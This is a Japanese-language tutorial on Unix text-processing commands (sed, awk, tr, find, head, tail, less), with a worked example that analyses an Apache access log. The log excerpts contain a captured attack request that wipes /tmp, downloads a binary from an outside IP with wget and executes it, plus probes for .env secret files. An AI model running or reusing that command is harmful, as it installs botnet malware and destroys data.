\u0026#34;abc123\u0026#34;\u0026#39; awk \u0026#39;!($5 == \u0026#34;abc123\u0026#34;)\u0026#39; 重複の扱い uniq sed awk 重複する連続した行を削除します。 一連の重複行の最初の行は保持され、残りは削除されます。\nuniq sed \u0026#39;$!N; /^\\(.*\\)\\n\\1$/!P; D\u0026#39; awk \u0026#39;a !~ $0; {a=$0}\u0026#39; sed awk 重複が連続していない行を削除 sed -n \u0026#39;G; s/\\n/\u0026amp;\u0026amp;/; /^\\([ -~]*\\n\\).*\\n\\1/d; s/\\n//; h; P\u0026#39; awk \u0026#39;!a[$0]++\u0026#39; awk \u0026#39;!($0 in a){a[$0];print}\u0026#39; uniq sed 重複する行を除くすべての行を削除 uniq -d sed \u0026#39;$!N; s/^\\(.*\\)\\n\\1$/\\1/; t; D\u0026#39; 行削除 tail awk 最初の行を削除 tail -n +2 awk \u0026#39;NR \u0026gt; 1\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ sed awk perl 最初の 10 行を削除 sed \u0026#39;1,10d\u0026#39; awk \u0026#39;NR \u0026gt; 10\u0026#39; perl -ne \u0026#39;print unless 1 .. 10\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ awk sed 5 行目を削除 awk \u0026#39;NR != 5\u0026#39; sed \u0026#39;5d\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ awk sed 5から10 といった範囲の行を削除 awk \u0026#39;NR \u0026lt; 5 || NR \u0026gt; 10\u0026#39; sed \u0026#39;5,10d\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ sed 最後の行を削除します。 sed \u0026#39;$d\u0026#39; sed 最後の 2 行を削除します sed \u0026#39;N;$!P;$!D;$d\u0026#39; sed 最後の 10 行を削除します。 sed -e :a -e \u0026#39;$d;N;2,10ba\u0026#39; -e \u0026#39;P;D\u0026#39; sed -n -e :a -e \u0026#39;1,10!{P;N;D;};N;ba\u0026#39; gsed sed 8 行ごとに削除します gsed \u0026#39;0~8d\u0026#39; sed \u0026#39;n;n;n;n;n;n;n;d;\u0026#39; sed パターンに一致する行を削除 sed \u0026#39;/pattern/d\u0026#39; grep sed awk 空行をすべて削除 grep -v ^$ grep \u0026#39;.\u0026#39; sed \u0026#39;/^$/d\u0026#39; sed \u0026#39;/./!d\u0026#39; awk NF awk \u0026#39;/./\u0026#39; ヒント grep -v \u0026quot;^$\u0026quot; をパイプで組み合わせて使うことが一般的ですが、sed '/^$/d' を覚えておくと、以降の理解が進むと思います。 cat sed 最初の空白行を除く連続する空白行を削除し、先頭と末尾のすべての空白行も削除 cat -s # method 1, allows 0 blanks at top, 1 at EOF sed \u0026#39;/./,/^$/!d\u0026#39; # method 2, allows 1 blank at top, 0 at EOF sed \u0026#39;/^$/N;/\\n$/D\u0026#39; sed 最初の 2 行を除く連続する空白行をすべて削除 sed \u0026#39;/^$/N;/\\n$/N;//D\u0026#39; sed 先頭の空白行をすべて削除 sed \u0026#39;/./,$!d\u0026#39; sed 末尾の空白行をすべて削除 sed -e :a -e \u0026#39;/^\\n*$/{$d;N;ba\u0026#39; -e \u0026#39;}\u0026#39; sed -e :a -e \u0026#39;/^\\n*$/N;/\\n$/ba\u0026#39; sed 各段落の最後の行を削除 sed -n \u0026#39;/^$/{p;h;};/./{x;/./p;}\u0026#39; sed 文字列を含む行を削除 (例: \u0026lsquo;bbo\u0026rsquo;) cat filename | sed \u0026#39;/bbo/d\u0026#39; ヒント sed '/regex/d' の d オプションは delete（消す）という意味となります。 sed 1行目を削除 cat filename | sed 1d sed 最初の１００行（１行目から１００行目まで）を削除 cat filename | sed 1,100d sed 空行の削除 cat filename | grep -v \u0026#34;^$\u0026#34; または、\ncat filename | sed \u0026#39;/^$/d\u0026#39; ヒント このパターンは必ず身につけましょう。 sed 最後の行を削除 cat filename | sed \u0026#39;$d\u0026#39; sed ファイルの末尾から最後の文字を削除 cat filename | sed -i \u0026#39;$ s/.$//\u0026#39; sed 先頭の空白とタブを削除 cat filename | sed -e \u0026#39;s/^[ \\t]*//\u0026#39; sed 先頭の空白のみを削除 cat filename | sed \u0026#39;s/ *//\u0026#39; sed 末尾のカンマを削除 cat filename | sed \u0026#39;s/,$//g\u0026#39; 行挿入 sed 最初の行として挿入 sed \u0026#39;1 i foo sed 最初の行の後に (2 行目として) 挿入 sed \u0026#39;1 a foo\u0026#39; sed AAA を含む行の上に BBB を含む行を挿入 sed \u0026#39;/AAA/i BBB\u0026#39; 文字列の作成 awk 特定の長さの文字列を作成します (例: 513 スペースを生成) awk \u0026#39;BEGIN{while (a++\u0026lt;513) s=s \u0026#34; \u0026#34;; print s}\u0026#39; awk 特定の文字位置に特定の長さの文字列を挿入 (例 では、各入力行の列 6 の後に 49 個のスペースを挿入します)。\ngawk --re-interval \u0026#39;BEGIN{while(a++\u0026lt;49)s=s \u0026#34; \u0026#34;};{sub(/^.{6}/,\u0026#34;\u0026amp;\u0026#34; s)};1\u0026#39; ファイル検索 find 現在のディレクトリ内のすべてのサブディレクトリ/ファイルを一覧表示 find . find 現在のディレクトリの下にあるすべてのファイルを一覧表示 find . -type f find 現在のディレクトリの下にあるすべてのディレクトリを一覧表示 find . -type d find 現在のディレクトリの下にあるすべてのファイルを編集 (たとえば、\u0026lsquo;www\u0026rsquo; を \u0026lsquo;ww\u0026rsquo; に置き換えます)。\nfind . -name \u0026#39;*.php\u0026#39; -exec sed -i \u0026#39;s/www/w/g\u0026#39; {} \\; find ファイル名のみを検索して出力 (例: \u0026ldquo;mso\u0026rdquo;) find mso*/ -name M* -printf \u0026#34;%f\\n\u0026#34; find システム内の大きなファイルを見つける (例: \u0026gt;4G) find / -type f -size +4G find サイズが 74 バイト未満のファイルを見つけて削除する find . -name \u0026#34;*.mso\u0026#34; -size -74c -delete find 空の (0 バイト) ファイルを見つける find . -type f -empty find ディレクトリ内のすべてのファイルを再帰的にカウントする find . -type f | wc -l 並べ替え sort 列ごとにファイルを並べ替え、元の順序を維持する sort -k3,3 -s 折返し fold 指定された幅に収まるように各入力行を折り返す (例: 1 行あたり 4 つの整数)\necho \u0026#34;00110010101110001101\u0026#34; | fold -w4 0011 0010 1011 1000 1101 タブの置換 expand タブをスペースに変換 expand filename unexpand スペースをタブに変換 unexpand filename Webページをダウンロード wget Webページをダウンロード wget -r -l1 -H -t1 -nd -N -np -A mp3 -e robots=off http://example.com wget ファイル名を指定してダウンロード(長い名前の場合) wget -O filename \u0026#34;http://example.com\u0026#34; wget ファイルをフォルダーに wget -P /path/to/directory \u0026#34;http://example.com\u0026#34; 文字の削除と置換 tr すべての非出力文字を削除 tr -dc \u0026#39;[:print:]\u0026#39; \u0026lt; filename tr 改行を削除 cat filename | tr -d \u0026#39;\\n\u0026#39; ヒント -d オプションは \u0026ndash;delete と書いても同じです。 tr --delete \u0026#39;\\n\u0026#39; \u0026lt;input.txt \u0026gt;output.txt または\ntr -d \u0026#39;\\n\u0026#39; \u0026lt;input.txt \u0026gt;output.txt tr 改行を置換 tr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39; \u0026lt;filename\u0026gt; tr 大文字/小文字へ tr /a-z/ /A-Z/ tr 改行をスペースに変換します。 This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | tr -d \u0026#39;\\n\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts.This document is herewith granted to the Public Domain. No copyright!bash-3.2$ tr CRLF を LF 形式に変換します。 行末にCRLF形式の改行「\r」が入っているテキスト。\n「\r」は、Ctrl＋VとCtrl＋Mで入力できます。\nThis book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat CRLF.txt This book is suitable for classroom use as a general introduction to programming concepts.\rThis document is herewith granted to the Public Domain. No copyright!\rbash-3.2$ cat CRLF.txt | tr -d \u0026#39;\\r\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ openssl 16 進数の MD5 チェックサム値を base64 エンコード形式に変換します。 openssl md5 -binary /path/to/file| base64 # NWbeOpeQbtuY0ATWuUeumw== 言語属性 アプリケーションが出力にデフォルト言語を使用することを強制します export LC_ALL=C # to revert: unset LC_ALL 文字列を Base64 文字列としてエンコードする echo test|base64 #dGVzdAo= バッググラウンド処理 バックグラウンドで複数のコマンドを実行する (sleep 2; sleep 3) \u0026amp; # run parallelly sleep 2 \u0026amp; sleep 3 \u0026amp; CSV系 .xls を csv に変換 xls2csv filename ステータス処理 別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します (よくできました) cd tmp/ \u0026amp;\u0026amp; tar xvf ~/a.tar 別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する (終了していない) cd tmp/a/b/c ||mkdir -p tmp/a/b/c 圧縮・解凍 tar.bz2 ファイルを解凍します (例: file.tar.bz2)。 tar xvfj file.tar.bz2 tar.xz ファイルを解凍します (例: file.tar.xz)。 unxz file.tar.xz tar xopf file.tar pdftotext PDFをtxtに変換 sudo apt-get install poppler-utils pdftotext example.pdf example.txt catコマンド ファイルの内容を表示する ファイルの内容を行番号付きで表示する 複数ファイルを連結して1つのファイルにする 概要 「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。\n$ cat ＜ファイル名＞ catコマンドの書式 cat [オプション] ファイル1 ファイル2……\ncatコマンドの主なオプション catコマンドの主なオプションは次の通りです。\nオプション 長いオプション 意味 -n \u0026ndash;number 行番号を付け加える -b \u0026ndash;number-nonblank 行番号を付け加える。ただし空白行には付けない -s \u0026ndash;squeeze-blank 連続した空行を1行にする ヒント 一画面に収まらない長いファイルの場合は、lessコマンドを使うと便利です。 catコマンド詳細説明 ファイルの内容を出力 filenameの内容をターミナルに出力します。\n$ cat filename 長いファイルの場合は、lessコマンドを使います。\n$ cat filename | less ファイルの結合 複数のファイルを結合（連結）させて別ファイルへ出力します。\n$ cat filename1 filname2 \u0026gt; filename3 追記したい場合は「\u0026raquo;」を使います。\n$ cat filename1 filname2 \u0026gt;\u0026gt; filename3 ヒント 「\u0026gt;」をリダイレクト、「\u0026raquo;」をアペンドと言います。「\u0026gt;」はファイルを新規作成してファイルへ出力します。「\u0026raquo;」は既存のファイルへ追記出力します。 「\u0026gt;」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。 echoコマンド メッセージや環境変数を表示します。 概要 「echo」はメッセージなどを表示するコマンドです。\n$echo メッセージ でメッセージを表示します。\n$ echo $変数名 で環境変数やシェルスクリプト内の変数を表示する際にも使用います。\nechoコマンドの書式 echo [オプション] メッセージ\nechoの主なオプション オプション 意味 -n 最後の改行を出力しない -e エスケープを解釈する -E エスケープを解釈しない（デフォルト） echo コマンド詳細説明 echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを出力するために使用されます。\n\u0026lsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの出力\u0026#34;; echo -n \u0026#34;改行なしのテキストの出力\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの出力 改行なしのテキストの出力 削除\tバックスラッシュ\t文字 $ Hello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34;; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; ヒント echo の後ろに続く文字列は 「\u0026quot;\u0026quot;」（ダブるクォーテーション）または、「\u0026rsquo;\u0026rsquo;」（シングルクォーテーション）で囲みましょう。 行末の「;」（セミコロン）も忘れずに。 headコマンド headコマンドでファイルの先頭部分だけを表示する パイプを使って実行結果の最初の部分だけを確認する tailコマンドでファイルの末尾部分だけを表示する ログファイルを監視する 概要 headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。\n表示する行数は、オプションで変更することができます。\n$ cat ＜ファイル名＞ | head -n10 headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。\nheadコマンドの書式 head [オプション] ファイル名\nheadコマンドの主なオプション オプション 長いオプション 意味 -c 数字 \u0026ndash;bytes 数字 先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=10001000, M=10241024…） -n 数字 \u0026ndash;lines 数字 先頭から指定した行数のみ表示する -q \u0026ndash;quiet, \u0026ndash;silent ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う） -v \u0026ndash;verbose 常にファイルごとのヘッダ出力を行う headコマンド詳細説明 headコマンドはファイルの先頭から１０行を表示するコマンドです。\n$ cat filename | head よく使われるオプションは、出力する行数を指定するオプション「n」です。\n$ cat filename | head -n20 データをソートしてベスト１０を出力するという場合によく使います。\n$ sudo cat /var/log/httpd/access_log | grep -iv \u0026#34;ELB-Health-Checker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $1; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39; | sort | uniq -c | sort -nr | head sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。\nでは、順番に説明していきます。\nまずは純粋にアクセスログを出力します。\n長いのでheadコマンドを使いましょう。\nsuzuki$ sudo cat /var/log/httpd/access_log | head 172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; : : : AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。\ngrepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。\nsuzuki$ sudo cat /var/log/httpd/access_log | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | head 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; 98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] \u0026#34;GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws\u0026#34; 400 226 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] \u0026#34;GET http://dushu.baidu.com HTTP/1.1\u0026#34; 302 208 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] \u0026#34;POST / HTTP/1.1\u0026#34; 302 205 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] \u0026#34;GET /.env HTTP/1.1\u0026#34; 302 209 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; 61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] \u0026#34;GET http://dushu.baidu.com HTTP/1.1\u0026#34; 302 208 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] \u0026#34;CONNECT www.yahoo.com:443 HTTP/1.1\u0026#34; 302 210 \u0026#34;-\u0026#34; \u0026#34;Go-http-client/1.1\u0026#34; suzuki$ それっぽいログが出るようになりました。\n次にどこからのアクセスが多いのかを絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | head GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1 CONNECT guba.eastmoney.com:443 HTTP/1.1 GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1 CONNECT guba.eastmoney.com:443 HTTP/1.1 GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws GET http://dushu.baidu.com HTTP/1.1 POST / HTTP/1.1 GET /.env HTTP/1.1 GET http://dushu.baidu.com HTTP/1.1 CONNECT www.yahoo.com:443 HTTP/1.1 suzuki$ GETとPOSTの項目に絞り込まれました。\nawk コマンドの -F はセパレータで、この場合は \u0026lsquo;\u0026rdquo;\u0026rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。\n次は、GET, CONNECT, POSTなどのコマンドを除去します。\nawkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39; | head http://guba.eastmoney.com/list,hk01500_1.html guba.eastmoney.com:443 http://guba.eastmoney.com/list,hk01500_1.html guba.eastmoney.com:443 /shell?cd+/tmp;rm+-rf+*;wget+ http://dushu.baidu.com / /.env http://dushu.baidu.com www.yahoo.com:443 suzuki$ 次に、余計な出力を抑制します。\nここでは空白行を出力したくないので grep -v ^$ を使っています。\n非常によく使うオプションなので覚えておくとよいです。\nヒント grep -v ^$ 空行を出力しない 行頭を表す「^」と行末を表す「$」の間に何もないですね。 では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39;| grep -v ^$ | grep -v [*/] |s ort| head 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 suzuki$ 最後に、出力をアルファベット順に並べ替えます。sortでよいです。\nさらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。\nそして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39;|sort|uniq -c|sort -nr | head 850 http://dushu.baidu.com 839 /form.cgi 485 http://www.baidu.com/pub/css/new_font.css 477 / 265 * 258 guba.eastmoney.com:443 253 209 /.env 200 www.yahoo.com:443 184 istock.jrj.com.cn:443 suzuki$ ヒント :sudo cat filename | grep -v \u0026ldquo;除去したい文字列\u0026rdquo; | awk \u0026lsquo;{ print $2; }\u0026rsquo;| sort | uniq -c |sort -nr | head これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。 head コマンドの紹介の割には長くなりました。\ntailコマンド tailコマンドでファイルの末尾部分だけを表示する ログファイルを監視する ファイルの特定の範囲の行を取り出す（headとtail） 概要 headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。\nログファイルは、基本ファイルの末尾に新たな記録が追加されます。\n「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。\n「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。\n$ cat ＜ファイル名＞ | tail tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。\n$ cat ＜ファイル名＞ | tail -n10 また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。\nログ監視などに多用されるこの具体例も以下に示します。\n$ sudo tail -f /var/log/httpd/access_log tailコマンドの書式 tail [オプション] ファイル名\ntailコマンドの主なオプション 短いオプション 長いオプション 意味 -c 数字 \u0026ndash;bytes 数字 末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=10001000, M=10241024…） -n 数字 \u0026ndash;lines 数字 末尾の指定した行数のみ表示する -q \u0026ndash;quiet, \u0026ndash;silent ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う） -v \u0026ndash;verbose 常にファイルごとのヘッダ出力を行う -f \u0026ndash;follow ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了） tailコマンド詳細説明 tailコマンドでファイルの末尾部分だけを表示する ファイルの末尾を表示します。tail -n で表示行数を変更できます。\ntail -n10 と デフォルトの tail は同じ出力となります。\n$ cat filename | tail -n10 ログファイルを監視する tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。\n$ sudo tail -f /var/log/httpd/error_log ヒント tail -f コマンドはとてもよく使います。 tail -f を実行するtailf コマンドもあります。(Oによりますが) ファイルの特定の範囲の行を取り出す（headとtail） ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？\ncat filename | tail -n200 これだとファイル末尾から200行を出力するにすぎない。\ntail コマンドのみに頼ろうとすると難しいようだ。\n実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。\n$ cat filename | tail -n200 | head -n 100 コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。\n$ cat filename | head -n10100 | tail -n100 lessコマンド テキストを1画面ずつ表示する キー操作のヘルプを表示する 長い行を折り返さずに表示する ファイルの末尾まで表示したらすぐに終了する 概要 「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。\n$ cat ＜ファイル名＞ | less 「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。\n$ dmesg | less ヒント ［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。 同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。\nlessコマンドの書式 less [オプション] ファイル名\nコマンド | less [オプション]\nlessコマンドの主なオプション 短いオプション 長いオプション 意味 +行数,-行数 指定した行から表示する +/文字列 指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能） -p文字列 \u0026ndash;pattern=文字列 指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能） -oファイル \u0026ndash;log-file=ファイル パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される -Oファイル \u0026ndash;LOG-FILE=ファイル 「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする -kファイル名 \u0026ndash;lesskey-file=ファイル名 lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する -L \u0026ndash;no-lessopen 環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する lessコマンド詳細説明 テキストを1画面ずつ表示する $ less ＜ファイル名＞ で、指定したファイルを1画面ずつ表示します。\n次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。\n上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。\n［q］キーを押すと終了します。\n以下のような使い方もできます。\n$ cat \u0026lt;filename\u0026gt; | less キー操作のヘルプを表示する lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます。\nヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。\n［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります\n長い行を折り返さずに表示する lessコマンドでは、画面の横幅より長い行は折り返して表示されます。\n折り返さずに表示したい場合は、「-S」オプションを使用します。\n左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。\n横スクロールの幅は「-#」オプションで指定できます。　$ cat filename | less -S ヒント ［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。 moreコマンド 長いメッセージやテキストファイルを1画面ずつ表示する テキストを1画面ずつ止めながら表示する 実行結果を止めながら表示したいときにはパイプを使う 確認したい箇所がある場合は「+/オプション」でスキップ 行番号付きで表示したいときはcatコマンドと組み合わせる moreコマンドで使える主なサブコマンド moreコマンド概要 moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。\n$ more \u0026lt;ファイル名\u0026gt; で実行する他、\n$ cat \u0026lt;ファイル名\u0026gt; | more 